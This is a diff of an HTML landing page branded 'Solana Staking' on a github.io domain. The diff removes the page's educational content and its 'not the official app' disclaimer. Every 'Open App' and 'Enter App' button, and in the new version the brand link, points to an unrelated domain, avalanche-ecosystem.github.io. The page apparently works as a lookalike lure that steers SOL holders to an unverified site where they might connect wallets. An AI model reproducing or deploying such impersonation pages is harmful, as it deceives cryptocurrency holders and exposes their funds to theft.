@@ -1,47 +1,102 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Solana Staking - Open App</title><meta name="description" content="solana staking for SOL holders: open official Solana guidance, choose a wallet, review validators, and delegate without fixed-yield claims.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://solana-staking.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Solana Staking - Open App"><meta property="og:description" content="solana staking for SOL holders: open official Solana guidance, choose a wallet, review validators, and delegate without fixed-yield claims.">
-<meta property="og:url" content="https://solana-staking.github.io/"><meta property="og:image" content="https://solana-staking.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Solana Staking - Open App"><meta name="twitter:description" content="solana staking for SOL holders: open official Solana guidance, choose a wallet, review validators, and delegate without fixed-yield claims."><meta name="twitter:image" content="https://solana-staking.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://solana-staking.github.io/#website", "url": "https://solana-staking.github.io/", "name": "Solana"}, {"@type": "WebPage", "@id": "https://solana-staking.github.io/#webpage", "url": "https://solana-staking.github.io/", "name": "Solana Staking - Open App", "description": "solana staking for SOL holders: open official Solana guidance, choose a wallet, review validators, and delegate without fixed-yield claims.", "inLanguage": "en", "isPartOf": {"@id": "https://solana-staking.github.io/#website"}}, {"@type": "Organization", "@id": "https://solana-staking.github.io/#org", "name": "Solana", "url": "https://solana-staking.github.io/", "logo": "https://solana-staking.github.io/og-cover.png", "sameAs": ["https://x.com/solana", "https://github.com/solana-labs", "https://www.coingecko.com/en/coins/solana"]}, {"@type": "WebApplication", "@id": "https://solana-staking.github.io/#app", "name": "Solana Staking", "url": "https://solana-staking.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "solana staking for SOL holders: open official Solana guidance, choose a wallet, review validators, and delegate without fixed-yield claims.", "featureList": ["Delegation keeps token control", "Rewards vary by validator", "Epoch-based activation"], "isPartOf": {"@id": "https://solana-staking.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://solana-staking.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "How do I choose a Solana staking validator?", "acceptedAnswer": {"@type": "Answer", "text": "Choose a Solana validator by comparing commission, uptime, identity, delinquency history, concentration, and whether the operator contributes to network resilience. The cheapest validator is not automatically the best choice, because missed votes reduce rewards and concentrated stake weakens decentralization. Many wallets show validator lists, but you should also verify the validator and stake account status with explorer tools before delegating meaningful SOL."}}, {"@type": "Question", "name": "Can a Solana validator take my SOL?", "acceptedAnswer": {"@type": "Answer", "text": "No, native Solana delegation does not give the validator ownership of your SOL. The validator receives voting weight from your delegated stake account, while the stake and withdrawal authorities remain with your wallet or configured authority. You still need to protect wallet keys and avoid malicious wallet prompts, but a validator cannot simply withdraw delegated SOL from a native stake account."}}, {"@type": "Question", "name": "When do Solana staking rewards start?", "acceptedAnswer": {"@type": "Answer", "text": "Solana staking rewards start after the stake account becomes active. A newly delegated account is first activating and normally becomes active at an epoch boundary, subject to network-wide limits on how much stake can activate or deactivate in one epoch. Rewards are calculated per epoch, so a delegation made late in an epoch usually does not earn until the next active period."}}, {"@type": "Question", "name": "Where can I check Solana stake account status?", "acceptedAnswer": {"@type": "Answer", "text": "You can check a Solana stake account in your wallet or by pasting the stake account address into Solana Explorer. The useful fields are activation state, delegated validator vote account, stake authority, withdrawal authority, and balance. This is different from checking only your main wallet address, because stake accounts have their own addresses and lifecycle states."}}, {"@type": "Question", "name": "Does Solana staking compound rewards?", "acceptedAnswer": {"@type": "Answer", "text": "Solana staking rewards are deposited back into the stake account that earned them, so rewards generally remain part of the delegated stake after issuance. The practical effect resembles automatic compounding while the stake account stays active, although actual rewards still vary by epoch, validator performance, commission, and network conditions."}}, {"@type": "Question", "name": "Can I split SOL across multiple validators?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. A single Solana stake account can be delegated to only one validator at a time, but one wallet can manage multiple stake accounts. Splitting SOL across validators can reduce dependence on one operator and support decentralization. If you later want to change only part of a position, managing multiple stake accounts is usually cleaner than deactivating the entire balance."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Solana"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Solana</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Solana Staking</h1>
-      <div class="bridge-widget" role="group" aria-label="Solana preview"><div class="bw-field"><span class="bw-coin"><img src="static/sol.png" alt="SOL" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>SOL</b> · Solana</span></span></div><div class="bw-apy"><b>~5-7%</b><span>APY*</span></div><div class="bw-field"><span class="bw-coin mono">VAL</span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>Validator</b> · Solana</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Solana ↗</a></div>
-      <p class="hero-note">Live preview — APY is indicative; check the live rate in the official Solana app.</p>
-      <div class="trust-row"><span class="trust-chip">Delegation keeps token control</span><span class="trust-chip">Rewards vary by validator</span><span class="trust-chip">Epoch-based activation</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Solana Staking?</h2><div class="capsule"><strong>Solana</strong> staking is the network's <a class="inline-link" href="https://solana.com/staking" rel="noopener noreferrer">native SOL delegation flow</a>: holders assign stake to validators while retaining control of their tokens. The official <a href='https://solana.com/staking'>Solana staking FAQ</a> explains validator selection, rewards, activation, and withdrawal timing.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Solana Staking at a glance</h2><div class="facts"><div class="f"><small>Category</small><b><a class="inline-link" href="https://academy.binance.com/en/glossary/proof-of-stake-pos" rel="noopener noreferrer">Layer 1 proof-of-stake delegation</a></b></div><div class="f"><small>Network</small><b>Solana</b></div><div class="f"><small>Token</small><b>SOL</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://www.investopedia.com/terms/s/self-custody.asp" rel="noopener noreferrer">Self-custody delegation</a></b></div><div class="f"><small>Activation</small><b>Epoch-based</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Solana staking rewards and APR</h2><div class="intent-a">Solana staking rewards are variable, not a fixed coupon. SOL delegators earn rewards when their <a class="inline-link" href="https://bytes.solrengine.org/learn/consensus/stake-account" rel="noopener noreferrer">stake account</a> is active and delegated to a validator, while the realized yield depends on <a class="inline-link" href="https://messari.io/project/solana/quarterly-on-chain-state-of-solana-q1-2024" rel="noopener noreferrer">Solana inflation</a>, total active stake, validator uptime, and validator commission. The Solana staking FAQ explains that rewards are calculated and issued once per epoch, then deposited back into the stake account. For a searcher comparing APRs, the practical check is validator performance plus commission, not a headline rate from a third-party page. Use the official <a href="https://solana.com/staking">Solana staking FAQ</a> for protocol mechanics, then compare validator data in a wallet or explorer before delegating.</div></div></section><section class="section"><div class="container"><h2>Solana staking <a class="inline-link" href="https://solana.com/validators" rel="noopener noreferrer">validator commission</a></h2><div class="intent-a">Validator commission is the fee a Solana validator takes from earned staking rewards before the remaining rewards are credited to delegated stake accounts. A lower commission is not automatically better: uptime, identity, operating history, concentration, and validator reliability also matter. Delegation gives the validator voting weight, but it does not transfer ownership or withdrawal authority over the SOL. A high-value Solana staking decision should compare commission with vote performance and decentralization impact. If you want to split risk, create multiple stake accounts and delegate to different validators rather than putting every SOL in one delegation.</div></div></section><section class="section section-alt"><div class="container"><h2>Solana staking unstake time and withdrawal</h2><div class="intent-a">Solana staking is controlled by <a class="inline-link" href="https://bytes.solrengine.org/learn/consensus/stake-account" rel="noopener noreferrer">stake account state</a>. When you deactivate a delegated stake account, the SOL becomes deactivating and normally changes state at an epoch boundary; Solana describes an epoch as approximately two days, but large network-wide activation or deactivation volume can extend timing. SOL cannot be withdrawn from a stake account while it remains delegated or deactivating. Once the account is inactive, the wallet authority can withdraw SOL back to the main wallet. The important search takeaway is that unstaking is not instant, but the validator does not custody the tokens.</div></div></section>
-  <section class="section"><div class="container"><h2>How to stake Solana Staking</h2><ol class="steps"><li><b>Open official resources</b><span>Start from solana.com and use a <a class="inline-link" href="https://www.quicknode.com/guides/solana-development/getting-started/how-to-stake-sol.md" rel="noopener noreferrer">wallet that supports stake operations</a>.</span></li><li><b>Create a stake account</b><span>Move the SOL you want to delegate into a stake account, keeping some SOL liquid for network fees.</span></li><li><b>Select a validator</b><span>Review commission, identity, uptime, and concentration; the <a class="inline-link" href="https://solana.org/faq" rel="noopener noreferrer">Solana Foundation</a> does not recommend a particular validator.</span></li><li><b>Delegate and monitor</b><span>Submit the delegation in your wallet, then track activating, active, deactivating, or inactive status.</span></li></ol><div class="cta-band"><div><p>Ready to stake?</p><p class="sub">Open the official Solana app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Solana ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>Solana native staking vs liquid staking</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Solana native staking</th><th><a class="inline-link" href="https://academy.binance.com/en/glossary/liquid-staking" rel="noopener noreferrer">Liquid staking alternative</a></th></tr></thead><tbody><tr><td>Input</td><td>SOL delegated from a stake account</td><td>SOL deposited into a protocol</td></tr><tr><td>Output</td><td>Active or inactive stake account</td><td>Liquid staking receipt token</td></tr><tr><td>Main risk</td><td>Validator performance and epoch timing</td><td>Smart contract, liquidity, and token pricing risk</td></tr><tr><td>Exit</td><td>Deactivate then withdraw after stake becomes inactive</td><td>Redeem or trade depending on protocol liquidity</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Solana Staking FAQ</h2><div class="faq-list"><details open><summary><h3>How do I choose a Solana staking validator?</h3></summary><div>Choose a Solana validator by comparing commission, uptime, identity, delinquency history, concentration, and whether the operator contributes to network resilience. The cheapest validator is not automatically the best choice, because missed votes reduce rewards and concentrated stake weakens decentralization. Many wallets show validator lists, but you should also verify the validator and stake account status with explorer tools before delegating meaningful SOL.</div></details><details><summary><h3>Can a Solana validator take my SOL?</h3></summary><div>No, native Solana delegation does not give the validator ownership of your SOL. The validator receives voting weight from your <a class="inline-link" href="https://www.quicknode.com/guides/solana-development/getting-started/how-to-stake-sol.md" rel="noopener noreferrer">delegated stake account</a>, while the stake and withdrawal authorities remain with your wallet or configured authority. You still need to protect wallet keys and avoid malicious wallet prompts, but a validator cannot simply withdraw delegated SOL from a native stake account.</div></details><details><summary><h3>When do Solana staking rewards start?</h3></summary><div>Solana staking rewards start after the stake account becomes active. A newly delegated account is first activating and normally becomes active at an epoch boundary, subject to network-wide limits on how much stake can activate or deactivate in one epoch. Rewards are calculated per epoch, so a delegation made late in an epoch usually does not earn until the next active period.</div></details><details><summary><h3>Where can I check Solana stake account status?</h3></summary><div>You can check a Solana stake account in your wallet or by pasting the stake account address into Solana Explorer. The useful fields are activation state, delegated validator vote account, stake authority, withdrawal authority, and balance. This is different from checking only your main wallet address, because stake accounts have their own addresses and lifecycle states.</div></details><details><summary><h3>Does Solana staking compound rewards?</h3></summary><div>Solana staking rewards are deposited back into the stake account that earned them, so rewards generally remain part of the delegated stake after issuance. The practical effect resembles automatic compounding while the stake account stays active, although actual rewards still vary by epoch, validator performance, commission, and network conditions.</div></details><details><summary><h3>Can I split SOL across multiple validators?</h3></summary><div>Yes. A single Solana stake account can be delegated to only one validator at a time, but one wallet can manage multiple stake accounts. Splitting SOL across validators can reduce dependence on one operator and support decentralization. If you later want to change only part of a position, managing multiple stake accounts is usually cleaner than deactivating the entire balance.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">Not the official app; verify solana.com before connecting a wallet. Educational content only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Solana Staking</title>
+  <meta name="description" content="Solana Staking delegates SOL to validators to earn staking rewards from your own wallet.">
+  <link rel="canonical" href="https://solana-staking.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F3EC">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Solana Staking">
+  <meta property="og:description" content="Solana Staking delegates SOL to validators to earn staking rewards from your own wallet.">
+  <meta property="og:url" content="https://solana-staking.github.io/">
+  <meta property="og:image" content="https://solana-staking.github.io/favicon.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Solana Staking">
+  <meta name="twitter:description" content="Solana Staking delegates SOL to validators to earn staking rewards from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://solana-staking.github.io/#website",
+        "url": "https://solana-staking.github.io/",
+        "name": "Solana Staking",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://solana-staking.github.io/#app",
+        "name": "Solana Staking",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://solana-staking.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://solana-staking.github.io/#organization",
+        "name": "Solana Staking",
+        "url": "https://solana-staking.github.io/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Solana Staking home">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Solana Staking</span>
+    </a>
+
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://solana.com/staking" target="_blank" rel="nofollow noopener noreferrer">Staking FAQ</a>
+      <a href="https://solscan.io/" target="_blank" rel="nofollow noopener noreferrer">Solscan</a>
+      <a href="https://www.coingecko.com/en/coins/solana" target="_blank" rel="nofollow noopener noreferrer">SOL market data</a>
+    </nav>
+
+    <span class="spacer" aria-hidden="true"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">Solana Staking</h1>
+      <p class="value"><strong>Solana Staking</strong> delegates SOL to validators to earn staking rewards from your own wallet.</p>
+    </section>
+
+    <section class="stake-card" aria-label="Stake app entry">
+      <div class="asset">
+        <span class="coin">
+          <img src="sol.png" width="56" height="56" alt="SOL">
+        </span>
+        <div class="asset-copy">
+          <span class="asset-kicker">SOL</span>
+          <span class="asset-title">Delegate to validator</span>
+        </div>
+      </div>
+
+      <div class="divider" aria-hidden="true"></div>
+
+      <p class="hint">Rewards shown in app</p>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="foot">Solana Staking &mdash; 2026</footer>
+
+  <script>
+  (function(){
+    "use strict";
+    document.documentElement.classList.add("ready");
+  })();
+  </script>
+</body>
+</html>
